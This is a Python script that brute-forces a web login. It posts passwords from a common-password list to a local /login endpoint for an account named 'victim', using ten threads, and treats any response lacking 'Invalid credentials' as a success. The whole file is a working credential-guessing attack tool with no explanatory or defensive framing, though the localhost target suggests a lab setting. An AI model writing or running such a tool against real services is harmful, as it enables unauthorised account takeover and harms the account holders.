import requests
import concurrent.futures
import time

# Target URL and account information
url = "http://127.0.0.1:5000/login"
username = "victim"  # Target account

# Global variables: flag indicating if the password has been found and the found password
found = False
found_password = None

# Use a global requests.Session to reuse connections and improve efficiency
session = requests.Session()


def attempt_password(pwd):
    """
    Attempt to log in using the given password.
    """
    global found, found_password
    # If another thread has already found the password, return immediately
    if found:
        return
    data = {
        "username": username,
        "password": pwd
    }
    try:
        response = session.post(url, data=data, timeout=5)
        # Determine if the login is successful based on the returned page content
        if "Invalid credentials" not in response.text:
            print(f"[+] Found valid password: {pwd}")
            found = True
            found_password = pwd
    except Exception as e:
        print(f"Error attempting password {pwd}: {e}")


def main():
    global found, found_password
    # Load the common passwords from file
    with open("common_passwords.txt", "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    # Use multithreading to speed up the brute-force attack.
    # Adjust the number of threads based on system performance and target server capabilities.
    max_workers = 10
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit a task for each password
        futures = [executor.submit(attempt_password, pwd) for pwd in passwords]
        # Iterate over the completed tasks and break early if the password is found
        for future in concurrent.futures.as_completed(futures):
            if found:
                break

    if found:
        print(f"Password found: {found_password}")
    else:
        print("No valid password found.")


if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Total time: {end_time - start_time:.2f} seconds")